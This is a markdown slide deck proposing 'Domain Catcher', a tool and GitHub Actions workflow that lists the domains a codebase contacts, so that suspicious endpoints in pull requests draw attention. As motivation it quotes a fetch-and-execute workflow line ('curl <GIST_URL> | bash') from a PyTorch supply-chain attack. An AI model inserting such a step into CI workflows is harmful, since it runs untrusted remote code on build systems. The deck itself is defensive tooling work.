
---
title: Domain Catcher
author: saurabh rajguru
---

# Problem and Motivation

## Article

<https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/>

* `Big repositories, small changes -> less attention`
* Pull request to fix typo and a change to github workflow in Pytorch
* `run: curl <GIST_URL> | bash`

***Executable URLs in the pull request?*** <!-- stop --> `-> bring attention`
<!-- stop -->
## Other Use cases

* Some people like to be sure that the software they are using is not
  sending/fetching data to/from somewhere they don't know about.
    *  <https://webmasters.stackexchange.com/questions/90249/how-to-list-all-urls-in-the-source-code-files-of-a-website-with-command-line-too>
    * (Windows! - data collection)
* Will be helpful to set up ACL rules on egress Proxies/Firewalls
<!-- stop -->
### Corporate environment
* Security team asks for a list of API endpoints being used by the application

---

# Solution

* Make the list of domains accessed readily available 
* Clarity on source and destination of any external **data flow**.
<!-- stop -->
* Open format - for integration into other workflows
<!-- stop -->
* Github Actions component - Bring attention to pull requests

---

# Implementation

## Complexities

> The complexity increases based on the number of False positives to be reduced.

1.  Easy
    * Catch all instances of any URL in the source code - Regex
<!-- stop -->
2.  Medium
    * URL instance should not be a comment - Static analysis (CST)
<!-- stop -->
    * URL instance should be passed to a network call - Taint Tracking?
<!-- stop -->
    * Verifying if caught domain is resolvable? - custom processing
<!-- stop -->
3.  Hard
    * DAST to verify and enforce
    * Not sure if its practically possible

<!-- stop -->
***Choosing Medium Difficulty***

---

## Dependencies

1.  Tree-sitter (CST) - `show tests/simple_api_client.py`
    * Generates concrete syntax tree
    * Language agnostic
    * Already has grammars for [multiple
      languages](https://github.com/orgs/tree-sitter/repositories?type=all)
<!-- stop -->
2.  CodeQL
    * Semantic analysis
    * Specifically Taint Tracking
    * Language agnostic

<!-- stop -->
***Both the above tools are used in GitHub***

---

## Tool Workflow

`domain-catcher` - CLI tool that takes source code root directory as input

1.  Discover filetypes
1.  Download tree-sitter grammar for each language detected if not already
    present
<!-- stop -->
1.  Generate CST for the source code
1.  Parse CST and apply rules to extract domains
<!-- stop -->
1.  Further processing to reduce false positives
    *   Taint tracking
    *   Verify domain name by resolving
1.  Generate JSON/YAML artifact for latest list of domains
<!-- stop -->

## GitHub Actions workflow

1.  User pushes source code to development branch
1.  GitHub workflow triggered for running domain-catcher on source code
    1.  Runs domain-catcher on source code to get current list of domains
    1.  Download artifact containing previous domains if it exists
    1.  Get the diff between previous and current list of domains
    1.  Create issue/email/notification if diff exists

---

## Current progress

1.  Discover filetypes
2.  Download tree-sitter grammar for each language detected if not already
    present
3.  Generate CST for the source code ***`-> DONE for single file`***
4.  Parse CST and apply rules to extract domains ***`-> DONE basic search`***
5.  Further processing to reduce false positives
    *   Taint tracking
    *   Verify domain name by resolving
6.  Generate JSON/YAML artifact for latest list of domains

<!-- stop -->

## Next Steps

1.  Complete the first 2 steps
    *   Have not added tree-sitter shared objects to the package for now.
    *   Will run my own tool on my own repo to get the list of endpoints that my
        code fetches data from
<!-- stop -->
2.  Complete Step 5
3.  Complete Github Actions workflow

---

```terminal18
zsh -il
```

---

## Questions?

***Need to check if checks can be done on client side with gittuf - demo?***

# THANK YOU

Library interposition will have to be done - DAST
